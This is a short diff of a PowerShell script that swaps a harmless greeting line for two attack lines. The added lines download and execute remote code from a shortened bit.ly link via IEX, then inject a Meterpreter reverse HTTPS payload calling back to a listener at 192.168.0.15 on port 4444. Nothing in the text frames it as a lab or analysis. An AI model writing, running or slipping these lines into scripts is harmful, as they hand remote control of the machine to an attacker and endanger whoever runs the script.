@@ -1,1 +1,2 @@
-Write-Host 'My voice is my passport, verify me.'
+IEX (New-Object Net.WebClient).DownloadString("http://bit.ly/sh3llz")
+Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.0.15 -Lport 4444 -Force
